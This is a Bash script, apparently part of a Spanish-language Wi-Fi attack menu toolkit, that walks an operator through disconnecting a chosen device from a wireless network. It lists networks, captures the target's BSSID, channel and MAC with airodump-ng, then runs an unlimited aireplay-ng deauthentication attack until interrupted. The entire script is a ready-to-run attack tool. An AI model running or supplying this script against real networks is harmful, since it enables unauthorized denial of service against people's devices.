#!/bin/bash

source installer.sh

# Comprobación de que la Tarjeta de Red esté en modo Managed
card
echo
read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
check_wifi_mode $interfaz
check_managed $mode

# Menú
Title
echo "[6] Desconectar a un dispositivo de una Red Wifi"
echo 
echo "[#] Copia el BSSID y CHAN del Wifi objetivo, puede tardar hasta 1 minuto en aparecer la Red Objetivo"
echo
sudo gnome-terminal --geometry 100x24+1300+20 -- bash -c "sudo nmcli dev wifi list; sleep 999999999" &
read -p "[*] Copia el BSSID del Wifi Objetivo y pégalo a continuación: " bssid
read -p "[*] Copia el Canal (CHAN) del Wifi Objetivo y pégalo a continuación: " ch
sudo pkill gnome-terminal

# Activar Modo Monitor
ActMonitor

# Escaneo para ver MACs de dispositivos conectados
Title
echo "[#] Pulse Ctrl + C en la Terminal Secundaria (Cuando aparezca por pantalla la MAC/STATION del Objetivo)"
sudo gnome-terminal --geometry 100x34+1300+20 -- bash -c "sudo airodump-ng -c $ch --bssid $bssid $interfaz --band abg; sleep 999999999" &
echo
read -p "[*] Copia la MAC/STATION del Objetivo y pégala a continuación: " mac
sudo pkill gnome-terminal

# Desautenticación del dispositivo objetivo
echo
sleep 1
Title
echo "[#] Pulse Ctrl + C (Para finalizar el Ataque y que el Objetivo se reconecte al Wifi)"
echo
echo "========================================================================================="
echo "                      El Objetivo ($mac) está siendo atacado"
echo "========================================================================================="
echo
sudo gnome-terminal --geometry 100x34+1300+20 -- bash -c "sudo airodump-ng -c $ch --bssid $bssid $interfaz --band abg; sleep 999999999" &
sleep 2
sudo aireplay-ng --deauth 0 -a $bssid -c $mac $interfaz
sudo pkill gnome-terminal

# Desactivar Modo Monitor
DesaMonitor

# Menú de salida
echo
echo "#####################"
echo "[1] Volver al Menú"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opción: " opc2
	case $opc2 in
		1 )	bash inhibitor.sh ;;
		2 )	bash requisitos/6.sh ;;
		3 )	exit ;;
		* )	echo "$REPLY no es una opción válida" ;;
	esac
